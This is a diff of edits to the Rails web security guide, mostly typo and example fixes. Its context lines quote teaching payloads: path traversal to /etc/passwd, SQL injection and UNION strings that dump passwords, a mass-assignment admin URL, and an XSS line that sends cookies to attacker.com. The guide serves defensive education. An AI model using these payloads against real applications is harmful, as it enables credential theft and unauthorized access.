@@ -291,7 +291,7 @@ def sanitize_filename(filename)
   returning filename.strip do |name|
     # NOTE: File.basename doesn't work right with Windows paths on Unix
     # get only the filename, not the whole path
-    name.gsub! /^.*(\\|\/)/, ''
+    name.sub! /\A.*(\\|\/)/, ''
     # Finally, replace all non alphanumeric, underscore
     # or periods with underscore
     name.gsub! /[^\w\.\-]/, '_'
@@ -326,7 +326,7 @@ Simply pass a file name like “../../../etc/passwd” to download the server's 
 <ruby>
 basename = File.expand_path(File.join(File.dirname(__FILE__), '../../files'))
 filename = File.expand_path(File.join(basename, @file.public_filename))
-raise if basename =!
+raise if basename !=
      File.expand_path(File.join(File.dirname(filename), '../../../'))
 send_file filename, :disposition => 'inline'
 </ruby>
@@ -381,7 +381,7 @@ end
 Mass-assignment saves you much work, because you don't have to set each value individually. Simply pass a hash to the new() method, or assign attributes=(attributes) a hash value, to set the model's attributes to the values in the hash. The problem is that it is often used in conjunction with the parameters (params) hash available in the controller, which may be manipulated by an attacker. He may do so by changing the URL like this:
 
 <pre>
-"name":http://www.example.com/user/signup?user=ow3ned&user[admin]=1
+"name":http://www.example.com/user/signup?user[name]=ow3ned&user[admin]=1
 </pre>
 
 This will set the following parameters in the controller:
@@ -396,7 +396,7 @@ Note that this vulnerability is not restricted to database columns.  Any setter 
 
 <ruby>
   class Person < ActiveRecord::Base
-    has_many :credits
+    has_many :children
 
     accepts_nested_attributes_for :children
   end
@@ -471,7 +471,7 @@ h4. Brute-Forcing Accounts
 
 -- _Brute-force attacks on accounts are trial and error attacks on the login credentials. Fend them off with more generic error messages and possibly require to enter a CAPTCHA._
 
-A list of user names for your web application may be misused to brute-force the corresponding passwords, because most people don't use sophisticated passwords. Most passwords are a combination of dictionary words and possibly numbers. So armed with a list of user name's and a dictionary, an automatic program may find the correct password in a matter of minutes.
+A list of user names for your web application may be misused to brute-force the corresponding passwords, because most people don't use sophisticated passwords. Most passwords are a combination of dictionary words and possibly numbers. So armed with a list of user names and a dictionary, an automatic program may find the correct password in a matter of minutes.
 
 Because of this, most web applications will display a generic error message “user name or password not correct”, if one of these are not correct. If it said “the user name you entered has not been found”, an attacker could automatically compile a list of user names.
 
@@ -536,7 +536,7 @@ h4. Good Passwords
 
 -- _Do you find it hard to remember all your passwords? Don't write them down, but use the initial letters of each word in an easy to remember sentence._
 
-Bruce Schneier, a security technologist, "has analysed":http://www.schneier.com/blog/archives/2006/12/realworld_passw.html 34,000 real-world user names and passwords from the MySpace phishing attack mentioned earlier. It turns out that most of the passwords are quite easy to crack. The 20 most common passwords are:
+Bruce Schneier, a security technologist, "has analysed":http://www.schneier.com/blog/archives/2006/12/realworld_passw.html 34,000 real-world user names and passwords from the MySpace phishing attack mentioned <a href="#examples-from-the-underground">below</a>. It turns out that most of the passwords are quite easy to crack. The 20 most common passwords are:
 
 password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1, and monkey.
 
@@ -556,7 +556,7 @@ class File < ActiveRecord::Base
 end
 </ruby>
 
-This means, upon saving, the model will validate the file name to consist only of alphanumeric characters, dots, + and -. And the programmer added \^ and $ so that file name will contain these characters from the beginning to the end of the string. However, _(highlight)in Ruby ^ and $ matches the *line* beginning and line end_. And thus a file name like this passes the filter without problems:
+This means, upon saving, the model will validate the file name to consist only of alphanumeric characters, dots, + and -. And the programmer added ^ and $ so that file name will contain these characters from the beginning to the end of the string. However, _(highlight)in Ruby ^ and $ matches the *line* beginning and line end_. And thus a file name like this passes the filter without problems:
 
 <plain>
 file.txt%0A<script>alert('hello')</script>
@@ -572,7 +572,7 @@ h4. Privilege Escalation
 
 -- _Changing a single parameter may give the user unauthorized access. Remember that every parameter may be changed, no matter how much you hide or obfuscate it._
 
-The most common parameter that a user might tamper with, is the id parameter, as in +":id":http://www.domain.com/project/1+, whereas 1 is the id. It will be available in params in the controller. There, you will most likely do something like this:
+The most common parameter that a user might tamper with, is the id parameter, as in +http://www.domain.com/project/1+, whereas 1 is the id. It will be available in params in the controller. There, you will most likely do something like this:
 
 <ruby>
 @project = Project.find(params[:id])
@@ -621,7 +621,7 @@ SQL injection attacks aim at influencing database queries by manipulating web ap
 Project.find(:all, :conditions => "name = '#{params[:name]}'")
 </ruby>
 
-This could be in a search action and the user may enter a project's name that he wants to find. If a malicious user enters ' OR 1=1', the resulting SQL query will be:
+This could be in a search action and the user may enter a project's name that he wants to find. If a malicious user enters ' OR 1 --, the resulting SQL query will be:
 
 <sql>
 SELECT * FROM projects WHERE name = '' OR 1 --'
@@ -631,7 +631,7 @@ The two dashes start a comment ignoring everything after it. So the query return
 
 h5. Bypassing Authorization
 
-Usually a web application includes access control. The user enters his login credentials, the web applications tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.
+Usually a web application includes access control. The user enters his login credentials, the web application tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.
 
 <ruby>
 User.find(:first, "login = '#{params[:name]}' AND password = '#{params[:password]}'")
@@ -640,7 +640,7 @@ User.find(:first, "login = '#{params[:name]}' AND password = '#{params[:password
 If an attacker enters ' OR '1'='1 as the name, and ' OR '2'>'1 as the password, the resulting SQL query will be:
 
 <sql>
-SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'&gt;'1' LIMIT 1
+SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
 </sql>
 
 This will simply find the first record in the database, and grants access to this user.
@@ -663,7 +663,7 @@ This will result in the following SQL query:
 
 <sql>
 SELECT * FROM projects WHERE (name = '') UNION
-  SELECT id,login AS name,password AS description,1,1,1 FROM users --')
+  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
 </sql>
 
 The result won't be a list of projects (because there is no project with an empty name), but a list of user names and their password. So hopefully you encrypted the passwords in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That's why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.
@@ -729,7 +729,7 @@ These examples don't do any harm so far, so let's see how an attacker can steal 
 <script>document.write(document.cookie);</script>
 </plain>
 
-For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review his web server's access log files to see the victims cookie.
+For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review his web server's access log files to see the victim's cookie.
 
 <html>
 <script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
@@ -753,7 +753,7 @@ With web page defacement an attacker can do a lot of things, for example, presen
 
 This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iframe is taken from an actual attack on legitimate Italian sites using the "Mpack attack framework":http://isc.sans.org/diary.html?storyid=3015. Mpack tries to install malicious software through security holes in the web browser – very successfully, 50% of the attacks succeed.
 
-A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site's original, but transmits the user name and password to the attackers site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.
+A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site's original, but transmits the user name and password to the attacker's site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.
 
 Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":
 
@@ -828,7 +828,7 @@ MySpace blocks many tags, however it allows CSS. So the worm's author put JavaSc
 <div style="background:url('javascript:alert(1)')">
 </html>
 
-So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript allows has a handy eval() function which executes any string as code.
+So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript has a handy eval() function which executes any string as code.
 
 <html>
 <div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
@@ -901,7 +901,7 @@ h4. Command Line Injection
 
 -- _Use user-supplied command line parameters with caution._
 
-If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and \+command+. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).
+If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and `command`. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).
 
 A countermeasure is to _(highlight)use the +system(command, parameters)+ method which passes command line parameters safely_.
 
